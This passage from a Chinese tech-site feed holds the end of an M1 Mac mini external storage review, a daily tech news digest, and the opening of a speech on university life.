瘦长些，重量却还要轻很多。这让我不再有收纳难题，相比起过去手机大小的移动硬盘，这才是可以纳入 Every Day Carry 的尺寸和重量；磨砂的质感、顺滑的倒角，在小小的尺寸里，1 T 的容量令人惊喜。回头看 DAS 方案的大傻个子，搞得我有点尴尬。没错，DAS 能纳下更大的空间，但这也意味着失去了移动的可能性，而且硬盘转起来颇有种「炒豆子」的噪音，会让每日坐在电脑前办公娱乐的我有些小小的焦虑感。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4reso5b34t8ar53fk60.jpeg\"><figcaption>aigo S7 Pro</figcaption></figure><p>而这两个已经完败 DAS 方案的优势外，aigo 的这款 S7 Pro，作为上代旗舰产品，标称速度可达到 520MB/s，在 Mac 环境、格式化为 APFS 后，实测写入可以达到 390MB/s，读取可达到 363MB/s，足足是 DAS 方案的两倍多。可谓更小巧、更快，功耗还低（DAS 需要连接专门的电源）。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4resp5b34t8ar53fk6g.jpeg\"><figcaption>aigo S7 Pro 1T APFS 格式 M1 Mac 读写速度</figcaption></figure><p>而在 Windows 环境下，S7 Pro 实测写入 496MB/s，读取 569MB/s，符合官方标称。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4respdb34t8ar53fk70.jpeg\"><figcaption>aigo S7 Pro 1T NTFS 格式 Windows 读写速度</figcaption></figure><p>不过当然了，再怎么说，固态硬盘还是比机械硬盘贵一些。铁威马这款硬盘坞的常态价是 499 元，4T 蓝盘的购入价是 469 元，合计 988 元。而 aigo 的 S7 Pro，1T 版本常年价在 700 块上下。这么一看，DAS 方案还是有一定合理性的。</p>\n<p>然而，价格不像配置那样恒定，总是会被各种各样的原因影响。一场疫情已使全球供应链产能紧张，疯狂的挖矿事业又更加火上浇油。显卡价格在沉沉浮浮中比股票还动荡，真正有需求的人不得不把装机日程一拖再拖。更坏的消息是，机械硬盘也涨了。「Chia 奇亚币」的横空出世和「硬盘挖矿」的诡异技术，让攒硬盘中的我苦不堪言。过去半年内，我密切关注着硬盘的售价，时不时打开收藏夹看价格变化，一度成为我茶余饭后的习惯。</p>\n<p>我的观察是，在当下，机械硬盘的价格虽然有一定幅度的回落，仍未到正常，更是和「性价比」相去甚远。而固态硬盘早先虽然也随着涨了一波价，年中后却因产能提升逐渐降了回来。固态硬盘在一开始就不能用来挖矿，涨价更像是矿潮引起的哄抢，如今市场发挥了功力，把价格调整回来，甚至一度到了低价。考虑到像西数蓝盘这样标志性的机械硬盘，4T 型号大部分已从四百涨至六百元价位，就算机械硬盘空间更大，但速度、便携性、噪音等多方面落后的体验下，加上自己拆装、等待好价等等的折腾，如果你对存储空间没有特殊的需求，我还是更建议你买一块成品移动硬盘。一番体验下来，我手中的一台 aigo S7 Pro，使用的舒适感已经超越 DAS 方案了。</p>\n<p>而这并不是全部。aigo 又给我寄来一块比 S7 Pro 稍贵些的 P1，采用 NVMe 协议，标称速度可以达到 1084MB/s，APFS 格式下，除去损耗，实测速度稳定在 700MB/s 以上。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4resplb34t8amojcae0.jpeg\"><figcaption>aigo P1 1T APFS 格式 M1 Mac 读写速度</figcaption></figure><p>这个读写速度足以满足许多工程文件，比如 Final Cut Pro 外挂硬盘下剪辑的工作状态了，素材拷贝等处理更是不在话下。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4resptb34t893up9ed0.jpeg\"><figcaption>aigo P1</figcaption></figure><p>在 Windows 环境下，P1 实测写入 932MB/s，读取 990MB/s，如此速度的外挂硬盘已经可以跑大型游戏了。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4resqdb34t8amojcaeg.jpeg\"><figcaption>aigo P1 1T NTFS 格式 Windows 读写速度</figcaption></figure><p>S7 Pro 附赠了 C2C、C2A 两根数据线，照顾到旧电脑的使用体验；P1 则附带 C2C 口数据线，和一个 C2A 的转接头；随硬盘送了一个有点商务风的收纳套，灰色小巧。随着使用体验的加深，它们已经成为我日常的 EDC 产品。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4resqlb34t8ar53fk7g.jpeg\"><figcaption>戴上收纳套</figcaption></figure><h2>面向发烧友：雷电接口与 M.2 硬盘</h2>\n<p>尽管外置移动硬盘已经可以满足我大部分存储需求，但硬盘之坑深似海，既然路已至此，不到尽头不尽兴啊。我又开始寻找更快的方案，以求达到接口速度的极致。而这就必须上 M.2 固态硬盘了。要如何选购呢？</p>\n<p>首先我们要明确一件事情，硬盘最大化价值利用的前提是减少传输时的物理浪费，也就是说直接插在主板上才是最好的。可惜 M1 Mac mini 并没有给我们这样的机会。所以，有了「外接」这么一项限制，我们需要硬盘盒的帮忙，徒增了很多物理损失，再加上 M1 现有的问题，我们也就无法使外接 M.2 硬盘达到产品标称中的速度。所以在选购了五六块不同品牌的 M.2 SSD 后，我的经验是买性价比高的即可，这样不管是用于 M1 Mac 的扩容还是日后留作其他电脑设备的升级都有保障。</p>\n<h3>雷电硬盘盒</h3>\n<p>关于硬盘盒，我购置了两种类型的产品：一款是国产品牌 MAIWO 麦沃的 10Gbps USB 3.2 Gen2 硬盘盒，价格不足百元，小巧精致。但这只是过渡使用，因为这离雷电 3 的 22Gbps 数据传输带宽还差很远。实际上，若你考虑使用 10Gbps 硬盘盒 + M.2 硬盘的方案， 我建议你还是直接买高速移动硬盘来得便捷。硬盘盒的方案更符合闲置 M.2 硬盘再利用的定位。</p>\n<p>另一款是希捷的酷玩系列游戏扩展坞，拓展接口的同时，自带 4T 机械硬盘和 M.2 的固态硬盘接口。以下的读写测试就基于这台希捷拓展坞。由于其还要分配带宽给机械硬盘和其他接口，必然会再次使 M.2 硬盘速度有所损失，测速仅做参考。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4resrlb34t893up9edg.jpeg\"><figcaption>希捷酷玩拓展坞</figcaption></figure><p>倘若你想要纯粹的雷电 3 接口硬盘盒，那么我推荐国产品牌 JEYI 佳翼的雷电 3 移动硬盘盒，常年价 600 元，是雷电 3 硬盘盒里口碑和性价比都相对优秀的产品。</p>\n<h3>M.2 固态硬盘</h3>\n<p>在 M.2 固态硬盘中，目前市面上口碑较好的是西部数据的 SN550，标称速度可达 2400MB/s。如果遇到好价，是值得购买的。我恰好就有一块 500G 的版本，618 期间三百出头的价格购入。1T 的好价则普遍在七百前后。</p>\n<p>使用希捷拓展坞，APFS 格式，实测速度为写入 1338MB/s，读取 2157MB/s。与标称有一定距离，但很可能是拓展坞占用带宽的问题。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4resslb34t893up9ee0.jpeg\"><figcaption>西部数据 SN550 500G 连接希捷拓展坞 APFS 格式 读写速度</figcaption></figure><p>这个读写速度基本支持我所有工作流的大文件读写了，几无超出范围的使用场景，虽说和 Mac 自带硬盘虽然还有距离，但我还是很满意的。</p>\n<p>巧的是，同样的价位段，aigo 也有一款 M.2 接口的高速固态硬盘，镁光 TLC，三年质保，中控型号为 Innogrit IG5216，3D TLC NAND 颗粒，支持 PCIe 3x4 通道闪存。从参数上看对于 Mac mini 拓展绰绰有余。我要（嫖）来了一块 1T 版本，售价和 SN550 1T 好价时相差无几。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4resstb34t897udghr0.jpeg\"><figcaption>开箱发现包装内附赠了螺丝，好评</figcaption></figure><p>将其抹为 APFS 格式后，同样的环境下，测试速度为写入 1347MB/s，读取 2424MB/s。表现和 SN550 差不大多。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4restdb34t893up9eeg.jpeg\"><figcaption>P3000 1T 连接希捷拓展坞 APFS 格式 读写速度</figcaption></figure><p>但这不该是这款硬盘极限，在 Windows 环境下，实测可以达到符合标称的 2800MB/s 写入，3400MB/s 读取。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4restlb34t893up9ef0.jpeg\"><figcaption>P3000 1T NTFS 格式 Windows 读写速度</figcaption></figure><p>可见 M1 芯片对外置 M.2 硬盘的支持确实不到位，以稳定著称的西部数据的 SN550 和 aigo 新品 P3000 均撞上了速度瓶颈。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4resttb34t897udghrg.jpeg\"><figcaption>aigo P3000</figcaption></figure><p>而作为对外置硬盘速度的对比，我也用 Blackmagic Disk Speed Test 测了测 Mac mini 这内置的 256G 固态硬盘的读写速度。由于没有物理损失，也不用分配带宽，写入速度达到了 2202MB/s，读取速度达到了 2978MB/s。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4resulb34t893up9efg.jpeg\"><figcaption>内置固态硬盘读写速度</figcaption></figure><p>总体来看 P3000 给我的印象还是很不错的，虽说因 M1 的困境导致无法发挥优势，但身处同价位的产品中优势更大，作为硬盘储备以后用在其他电脑上潜能也更多。截止发稿前 SN550 出现了降速门；另一款性价比产品铠侠 RC10 则存在 1T 版本性能弱于 500G 版本、且发热量较大的问题。考虑到雷电硬盘盒的昂贵，买 500 G 硬盘显然也不划算，1 T 仍然是当下市场里容量/价格比最合适的选项，而 aigo 的这款 P3000 1T 版，无疑是很值得考虑的选择。</p>\n<h3>万物归于 NAS</h3>\n<p>回看我们在开头列出的需求坐标轴，小容量低读写的碎片文件由 U 盘解决；小容量高读写的工程文件由移动硬盘、Gen2 硬盘盒解决；大容量高读写的大型工程文件由雷电硬盘盒解决；大容量低读写的备份文件则由 DAS 方案解决。不过，对于读写速度要求不是那么高的文件，NAS 总归是比 DAS 先进了很多的方案，那些折腾存储的人最后也十有八九落入 NAS 的深坑。我也不例外，趁着 6·18 买了人生第一台 NAS 主机，加上硬盘又花掉大半个 Mac mini 的钱。但这就是另一个故事了，在此不表。</p>\n<h2>写在最后：国货已是一流产品</h2>\n<p>坦白说，购入 M1 Mac mini 并开始研究存储设备以前，我从没想到过国产品牌可以在这个领域杀出一片耀眼的战场。实际上，有很多产品，我在购买时甚至完全没有注意到其是不是国货。本文所列出的，以及许多篇幅受限没有列入的品牌和产品，有许多都是我在使用并折服于优秀体验后才发觉它们的国产基因的。它们真的是很好的产品。即便位列在希捷、西部数据、东芝、三星这些传统国际大厂里，你也完全不需要因为「国货」属性特别加分再去支持国产，仅仅凭借品质和需求去挑选出来，使用体验也令人足够满足。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4resv5b34t8amojcaf0.jpeg\"><figcaption>aigo 在存储产业已经深耕了 21 年</figcaption></figure><p>这就是我的 M1 Mac mini 存储拓展之旅的收获，藉由苹果封闭的痛苦，却高兴地看到了另一个开放的世界。在这个世界里，国产品牌用自己的努力，切切实实地追逐着生产「国民好物」的目标。研究拓展存储时，我试了多种方案，走了不少弯路，不过，从一个「小白」成长到近似「发烧」的「感冒友」，虽然折腾，更多感受到的还是乐趣。看着那么多人类顶尖的技术，凝聚成眼前的一个个小盒子，冰冷的质感下也氤氲一丝温情。</p>\n<p>它们让我想起了《2001 太空漫游》里那枚启发人类智慧的黑色方碑，不同之处在于，方碑是不能解读的「神」，而我们身边的电子产品虽然在过去的人看来有如神迹，却是可以拆解、可以认识其技术基础的人造之物。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/07/article/5a20664b9edee76b39297d46816326cb\"><figcaption>2001 太空漫游</figcaption></figure><p>当一个物体不可被解释的时候，你的命运也会任其摆布；但如果你解构了它，甚至有能力亲手去创造一个它，命运才终于回到了自己手里。大到工业化现代化后的国产品牌，小到通过研究认知存储技术的我，其实都是从不知到有知，从被迫接受到有意愿地选择的过程。当然，这个过程很折腾，需要不断地试错；但从不了解到了解，逐渐参与世界的建设，这个过程同样意义非凡。</p>\n<p>© 本文著作权归作者所有，并授权少数派独家使用，未经少数派许可，不得转载使用。</p>\n","link":"https://sspai.com/post/68632"},{"title":"派早报：Vivo 正式发布 X70 系列手机、Aqara 宣布将支持 Matter 协议等","date":"2021-09-10 00:57:09","description":"\n<h2>你可能错过的新鲜事</h2>\n<h3>Vivo 正式发布 X70 系列手机</h3>\n<p>Vivo 于 9 月 9 日晚间正式发布了 X70 系列手机，该系列共计三款手机，分别为 Vivo X70、Vivo X70 Pro 和 Vivo X70 Pro+。机身设计上，X70 系列顶部与底部均采用棱线设计，机身背部采用汀步云阶设计。X70 Pro+ 会提供黑色 AG 玻璃以及橙色或蓝色素皮的版本，X70 Pro 和 X70 都有黑、白、青紫渐变 AG 玻璃版可选。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4tanrdb34td27usq0f0.jpeg\"></figure><p>在性能方面，Pro+ 搭载了骁龙 888+ 处理器，另两款新机都会提供基于联发科天玑 1200 和三星 Exynos 1080 的版本。三款产品都有 UFS 3.1 存储，但除了旗舰采用 LPDDR5 RAM 以外，还有两款用的都是 LPDDR4X。X70 和 X70 Pro 分别配备了 4,450mAh 和 4,400mAh 电池，均支持 44W 有线充电。而 Pro+ 所用的 4,500mAh 电池则支持 55W 有线充电以及 50W无线快充还有 10W 无线反充，屏幕上 X70 Pro+ 采用的是 6.78 吋 2K+ 120Hz E5 LTPO AMOLED 屏幕，而 X70 和 X70 Pro 使用的则都是 120Hz 的 6.56 吋 FHD+ 面板。</p>\n<p>影像方面，X70 全系列都采用了蔡司 T* 镀膜。正面都采用了 32MP 的自拍相机，后摄部分 X70 的三摄由 40MP 微云台主摄（50MP 的 IMX667V）、12MP 50mm 人像（IMX663，X60 Pro+ 同款）和 12MP 超广角相机组成，X70 Pro 则有 50MP 微云台主摄（IMX766V）、12MP 超广角、12MP 50mm 人像（IMX663）和 8MP 潜望远摄（5x 光学变焦）。X70 Pro+ 的 主摄端用了 50MP 的 ISOCELL GN1，超广角和 50mm 人像端分别用了 IMX598 和 IMX663，5x 远摄也还是 8MP，其中 X70 Pro+ 以及 X70 Pro 将搭载 Vivo 自研的 V1 影像处理器。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4tanrlb34td27usq0fg.jpeg\"></figure><p>售价上，X70 提供了8+128、8+256、12+256 三个版本，售价是 3699 元起；X70 Pro 多一个 12+512 型号，售价 4299 元起；X70 Pro+ 有 8+256、12+256 和 12+512 三档，售价是 5499 元起，X70 Pro/Pro+ 将会在 9 月 17 日线上线下同步开售，X70 则会在 9 月 30 日线上线下开售。<a href=\"https://www.ithome.com/0/574/546.htm\" target=\"_blank\">来源</a></p>\n<h3>Aqara 宣布将支持 Matter 协议</h3>\n<p>9 月 9 日，Aqara 官方宣布将支持 Matter 协议，根据连接标准联盟（CSA）消息，预计将于 2022 年上半年公布 Matter 智能家居标准，届时 Aqara 也将及时跟进。用户只需将 Aqara 网关 M1S 或网关 M2 进行固件升级，而无需购买新品。<a href=\"https://9to5mac.com/2021/09/08/aqara-matter-support-homekit/\" target=\"_blank\">来源</a></p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4tanrtb34td201m61gg.png\"></figure><h3>雷蛇发布巴塞利斯蛇 V3 游戏鼠标</h3>\n<p>9 月 9 日，雷蛇正式发布巴塞利斯蛇 V3 游戏鼠标，该鼠标仅有线模式，采用了人体工学设计，配备 10 + 1 个可编程按键以及 11 种 RGB 灯效。于此同时，也搭载了 FOCUS+ 光学传感器（PAW3399），最高 26000DPI，跟踪速度可达 650IPS，精度可达 99.6%。国行零售价 599 元。<a href=\"https://item.jd.com/10036316610353.html?\">来源</a></p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4tans5b34td27usq0g0.jpeg\"></figure><h3>Facebook 推出雷朋 Stories 智能眼镜</h3>\n<p>9 月 9 日，Facebook 宣布推出旗下第一款智能眼镜，这款智能眼镜是与 Ray-Ban 雷朋合作开发的，支持接打电话、拍照和收听音乐。这款眼镜在镜框的每一侧都配备了一组 500 万像素摄像头，支持案件或者 Facebook 助手拍摄照片或者 30s 视频，并能通过 Facebook View 快速将拍摄到的内容分享至海外各大社交媒体上；通过开放式扬声器和三麦克风阵列以实现接打电话和收听音乐等功能。这款眼镜内置电池可持续使用 6 小时，通过额外的便携式充电盒最长可使用三天。Ray-Ban Stories 起售价为 299 美元，拥有 20 种不同的组合款式。<a href=\"https://9to5mac.com/2021/09/09/facebook-announces-ray-ban-stories-smart-glasses-its-new-snapchat-spectacles-clone/\" target=\"_blank\">来源</a></p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4tansdb34td201m61h0.png\"></figure><h3>Windows 11 将对 CPU 和内存进行优化</h3>\n<p>微软副总裁在 9 月 9 日接受媒体采访时表示，Windows 11 针对 CPU 以及内存资源分配进行了优化，对应用程序以及进程的优先级进行更改，支持为前台应用分配更多的系统资源，尤其是在运行多个程序时可以节省几秒钟时间。另外 Windows 11 将设备从睡眠状态恢复的速度也比以前更快，这得益于 Windows 11 优化了硬件组件的调用。提供了类似移动设备的永远在线的体验。<a href=\"https://www.ithome.com/0/574/369.htm\" target=\"_blank\">来源</a></p>\n<h3>小米 11T 和 11T Pro 手机将延长支持时间</h3>\n<p>9 月 9 日，小米官方正式宣布，对于即将推出的小米 11T 以及 11T Pro 智能手机，它们将获得三个 Android 系统大版本的更新，以及四年的安全补丁更新。关于延长支持时间的计划，目前暂时未涉及其他设备。<a href=\"https://9to5google.com/2021/09/09/xiaomi-11t-series-promised-3-full-os-updates-4-years-of-security-patches/\" target=\"_blank\">来源</a></p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4tanslb34td27usq0gg.jpeg\"></figure><h3>魅族宣布删除「三零手机」内容，部分机型不受影响</h3>\n<p>魅族 Flyme 于 9 月 9 日下午在其微博上发布《致各位魅族用户的一封信》，正式宣布由于面临激烈的市场竞争，Flyme 决定在坚持用户体验的前提下，保持和行业一致的运营策略，间接宣布将不再采用此前的「三零手机」的运营策略，但会继续履行对用户的承诺，目前魅族 18、魅族 18 Pro 不受此次政策调整影响。<a href=\"https://m.weibo.cn/status/4679474551718232?\" target=\"_blank\">来源</a></p>\n<h3>Google 分享私有计算核心的更多细节</h3>\n<p>Android 12 加入的「私有计算核心」的概念，而 Google 在 9 月 9 日分享了该服务的更多细节，该服务首先会和其他操作系统部分以及应用分割开，在里面处理的数据不会分享给任何应用程序。同时为了增强该计算核心，还会通过云更新的方式进一步增强，例如下载新的语音识别模型或者最新的歌曲目录。<a href=\"https://9to5google.com/2021/09/09/android-private-compute-services/\" target=\"_blank\">来源</a></p>\n<h3>小米回应电视广告问题</h3>\n<p>9 月 8 日，小米官方在质量月活动中回应有关电视广告的问题。首先，关于广告加载和系统加载的先后问题，官方表示两者同时进行，但系统加载速度仍要继续优化。其次，关于取消开机广告的问题，官方只表示将平衡广告和用户体验，并未明确措施。<a href=\"https://cdn.cnbj1.fds.api.mi-img.com/middle.community.vip.bkt/e154079974d21e921f4667160056b5e2#vipAccount-img\" target=\"_blank\">来源</a></p>\n<h2><strong>少数派的近期动态</strong></h2>\n<ul>\n<li>🧑‍🏫 今天是 9 月 10 日教师节，祝少数派的教师读者、作者们教师节快乐，<a href=\"https://sspai.com/item/276#497\" target=\"_blank\">大师笔记</a> 的教师节优惠也于今日正式开始。</li>\n<li>📓 少数派会员通讯《<a href=\"https://sspai.com/prime/precog/vol07-pre-talk-about-notes\" target=\"_blank\">笔记大战</a>》已经上线，来看看他们的笔记工具方法论吧！</li>\n<li>🎁 会员周边将于即日起<strong>陆续</strong>发货，敬请期待。</li>\n<li>🎉 少数派正版软件商城 <a href=\"https://sspai.com/mall/discount/%E5%BC%80%E5%AD%A6%E5%AD%A3%E4%BF%83%E9%94%80\" target=\"_blank\">开学季促销</a> 开启，数十款优质软件低至 5 折起。</li>\n<li>📡 你会在日常生活中使用 5G 网络吗？去 <a href=\"https://sspai.com/bullet/1630048406\" target=\"_blank\">一派</a> 和大家聊聊。</li>\n<li>📕 由少数派编辑部联合优秀作者出版实体书《数字时代的效率手册》上线电商平台，立即前往 <a href=\"https://item.jd.com/12914331.html\" target=\"_blank\">5 折下单</a>。</li>\n</ul>\n<h2>你可能错过的好文章</h2>\n<ul>\n<li><a href=\"https://sspai.com/post/68666\" target=\"_blank\">🏄 都基于 Chromium，它有什么不同：Brave 浏览器简介</a></li>\n<li><a href=\"https://sspai.com/post/68665\" target=\"_blank\">🧈 App+1｜借 SmoothVideo Project 享受「丝般顺滑」的观影体验</a></li>\n<li><a href=\"https://sspai.com/post/68574\" target=\"_blank\">🧩 油猴使用指南 01：传说中的「油猴」与用户脚本</a></li>\n<li><a href=\"https://sspai.com/post/68675\" target=\"_blank\">🌟 新玩意 077｜少数派的编辑们最近买了啥？</a></li>\n<li><a href=\"https://sspai.com/post/68676\" target=\"_blank\">🔍 具透 | 最后一个测试版：Android 12 Beta 5 暗藏了哪些玄机？</a></li>\n</ul>\n<p>&gt; 下载 <a href=\"https://sspai.com/page/client\" target=\"_blank\">少数派 2.0 客户端</a>、关注 <a href=\"https://sspai.com/s/J71e\" target=\"_blank\">少数派公众号</a>，解锁全新阅读体验 📰</p>\n<p>&gt; 实用、好用的 <a href=\"https://sspai.com/mall\" target=\"_blank\">正版软件</a>，少数派为你呈现 🚀</p>\n<p> </p>\n<p>© 本文著作权归作者所有，并授权少数派独家使用，未经少数派许可，不得转载使用。</p>\n","link":"https://sspai.com/post/68682"},{"title":"大学四年，如何高质量地度过？","date":"2021-09-09 12:37:58","description":"\n<p>大家好，我是秦春华，很高兴来到知乎《大学第一课》和大家交流。</p>\n<p>一个月前，知乎的同学邀请我参加今天的活动，我问他们要我讲什么呀，他们说，您是考试院长，就结合您的经历和见闻，和即将迈进大学的同学们聊聊如何应对大学考试和大学生活吧。这对于我来说是个难题。用我女儿鄙视我的话说，我虽然是个考试院长，其实不会考试。我除了在高考时考得比较好之外，到目前为止没经历过什么重要的考试。</p>\n<p>但是，作为一个在大学里学习生活工作了三十年的教员，我见到了太多困惑、挣扎和觉醒的案例。在我的 Office Hour，学生和我聊的最多的不是学术，而是大学生活、心理问题乃至感情经历。这使我意识到，对你们而言，也许真正重要的，不是学习，不是考试，而是如何在大学里度过一段有意义的生命。</p>\n<p><br></p>\n<p><b>什么是大学</b></p>\n<p>同学们刚刚进入大学校门，你们有没有问过自己一个问题：什么是大学？这个你们即将在这里生活四年甚至更长时间的地方，对于你们而言意味着什么？</p>\n<p>实际上，从起源来看，东西方的大学是不一样的，尽管中国的现代大学制度是从西方引进的。西方的大学，无论是欧洲的还是美国的，和宗教有着极其密切的联系，但中国的大学则显著不同，除了历史上少数的教会大学之外，中国的大学诞生于 19 世纪末 20 世纪初的民族危难之际；20 世纪 30 年代外敌入侵，北大、清华、南开颠沛流离，在战火中组建西南联大，谱写了中国大学史上悲壮辉煌的绝唱；60 年代，以西安交通大学、西北工业大学等为代表的西迁高校，用一代代师生的搬迁史、创业史、奋斗史、发展史铸就了“西迁精神”的丰碑。一百多年来，除了大学的内在基因之外，中国大学与生俱来带有救亡色彩，其影响一直持续到今天。也就是说，大学对于同学们而言，不仅仅意味着个人事务，更重要的是，大学承担了实现中华民族伟大复兴的使命，是要救国强国的。特别是今天，面对极度复杂的国际环境，认识到这一点尤其重要。同学们，在中国上大学，一定要把自己和国家民族的命运联系在一起，这绝不是空话，而是刻在我们骨子里的基因。</p>\n<p><br></p>\n<p><b>你需要从大学获得什么</b></p>\n<p>那么，人为什么要上大学呢？你们来到大学又想要获得什么？</p>\n<p>我想起了三十年前，我只身一人扛着行李来到京城上大学，内心忐忑不安，但又对未来充满了希望。但那时候，我并没有想过这些问题。只想毕业后能有一个好工作。是的，大学会带给你一份好工作；从一般意义上说，越是好大学，会带给你更高的收入。知乎上有很多相关的话题和讨论。</p>\n<p>除此之外，我认为，大学对人最大的价值和意义在于：一所大学塑造了一个人的思维方式、气质格局、生活态度和价值观。概括说来，上大学最重要的是要获得四个“识”：知识、见识、胆识和认识。</p>\n<p><br></p>\n<p><b>知识</b></p>\n<p>第一个“识”是知识。这里所说的知识既不是你从知乎或者百度上搜索到的可以“涨知识”的内容，也不是你为了显示自己具有“深厚”的传统文化修养而死记硬背下来的几百首古诗词，甚至不是你在数学、物理、化学和工程等课堂上和教材里学到的公式和定理。真正的知识，是普罗米修斯从奥林匹斯山上盗取的火，是他向人类传授的艺术、写作、数学、天文、建筑和医学，是今天我们称之为“通识教育”，从而使人类摆脱了愚昧和无知的那些无比珍贵的礼物。</p>\n<p><br></p>\n<p><b>见识</b></p>\n<p>仅有知识是不够的，大学还将带给你第二个“识”：见识。</p>\n<p>所谓见识首先在于深刻的洞察力。《史记》里记载，秦穆公用五张黑羊皮从楚国赎回了百里奚，和他谈了三天三夜，高兴极了。可百里奚说，我的朋友蹇叔才是真正有才能的人。为什么这么说呢？因为我两次听了他的话都逃脱了危险，最后一次，我因为贪图富贵，没听他的话，结果就遭遇大难，差点连命都没了。你可以想象蹇叔知人识势的洞察力是多么惊人！除了洞察力，还要有判断力和感知力，而真正的见识就是洞察力、判断力和感知力的完美结合。</p>\n<p>当年刘邦进入咸阳后，其他人都在忙着争夺财宝美女，只有萧何直奔丞相府，把秦朝所有的地图、书籍和档案资料搜集起来。找到这些资料，就能知道全国有多少人口，府库有多少资源、秦朝的财政情况如何、全国各地有哪些险要之地需要驻兵把守，等等。在争夺天下的人眼中，这是比金银财宝要重要的多的东西——这是见识。</p>\n<p>王选先生早在 20 世纪 70 年代就确立了汉字激光照排的研发目标，提出跳过国外的“二代机”、“三代机”，直接研发“四代机”，使中国告别了铅与火，走进了光与电——这是见识。</p>\n<p>2012 年任正非就决定启动“鸿蒙计划”，他早就预见到了国外技术对我们“卡脖子”的那一天——这也是见识。</p>\n<p><br></p>\n<p><b>胆识</b></p>\n<p>第三，光有知识和见识还不够，人还要有胆识。说到这里我想起了女篮的一场比赛。去年年初，中国女篮正在海外比赛，为了争夺进军东京奥运会的资格而奋战，就在这个时候，新冠疫情在国内爆发了。在这种特殊时刻，赛前中国队心理教练黄菁和队员们说了这么一段话：</p>\n<p>当需要一个人站出来时，那叫勇敢；                 <br>当一个团队挺身而出时，那叫担当；        <br>当一个国家身处逆境，呼唤一种精神时，        <br>那就是使命，就是信念，就是一往无前！    </p>\n<p>什么是胆识？卒然临之而不惊，无故加之而不怒，泰山崩于前而色不变。面对危险时毫不畏惧，“虽千万人，吾往矣！“</p>\n<p>面对困难时毫不退缩，坚持到底；</p>\n<p>面对压力诱惑时“至大至刚”，“不惑，不忧，不惧”。</p>\n<p>归根到底，一个人的勇气来源于信念，事无不可对人言，相信自己做的是正确的事，自然没有丝毫犹豫和忧惧。今天的大学，在很大程度上忽视了对学生的“胆识”教育。</p>\n<p><br></p>\n<p><b>认识</b></p>\n<p>最后，所有这些知识、见识和胆识加在一起，形成最后一个“识”：认识。首先是认识你自己，也就是你作为一个独一无二的创造体，来到这个世间的使命。每个人的出生都是一个新的开始，新世界之所以是新的，就是因为有新的人出现，从而形成新的创造。</p>\n<p>其次是认识他人。人是社会性动物，只认识自身是远远不够的，还必须认识他人，和他人发生联系。孔子说：“仁者，人也。”这个“仁”，指的就是人和人之间的关系。只有在和他人的联系之中，“仁”才能得以实现。实际上，这恰恰是现代教育特别重视培养孩子的社交能力的原因所在。</p>\n<p>第三是认识世界。我和世界的关系是什么？我在世界中的位置是什么？世界对于我的意义是什么？想清楚这些根本性的大问题，才能在我们脆弱而干涸的心中注入力量，帮助我们战胜人生途中的种种困厄和艰难。</p>\n<p><br></p>\n<p><b>刚进大学的你有没有思考过这些问题</b></p>\n<p>同学们马上就要迈进大学校门了。大学的第一年对于很多同学而言也许会很艰难，很难适应，如果要让我提一些建议的话，我觉得有以下几个方面也许是重要的。</p>\n<p>首先，你还是要有一个大致的想法和规划。首先要明确一个自己的目标：等大学毕业的时候，我要得到什么？这个目标不需要有多么高大上，甚至庸俗一点都没关系，有目标是第一位的。三十年前，我迈进北大校门的那一刻，我告诉自己：四年后我要成为这个校园里最优秀人群中的一个。这个目标一直激励我去不断努力。其实，在追求目标的过程中，你自己就会发现，很多情况都变化了，你自己的想法也许会改变。这些都没关系，重要的是一定要有一个目标。</p>\n<p>其次，你应当学会自主地选择：包括选什么课，要不要去参加社团，参加什么社团，要不要读研究生，要不要留学，等等。选择的本质是时间和精力的分配，因为经济学上“机会成本”的存在，选择的代价有可能会很大。这里有个原则供你参考：一个是尽可能选基础的学科，以为将来的发展留有余地。北大元培学院有一个非常聪明的学生，在专业选择上遇到很大困惑，来找我商量。他原本在数学方向，可是他觉得自己和数学系的那些大牛相比，自己的智商被碾压；而且学数学也太辛苦了一些，所以他想去其他专业。我坚决反对。他听了我的劝，本科毕业后去了 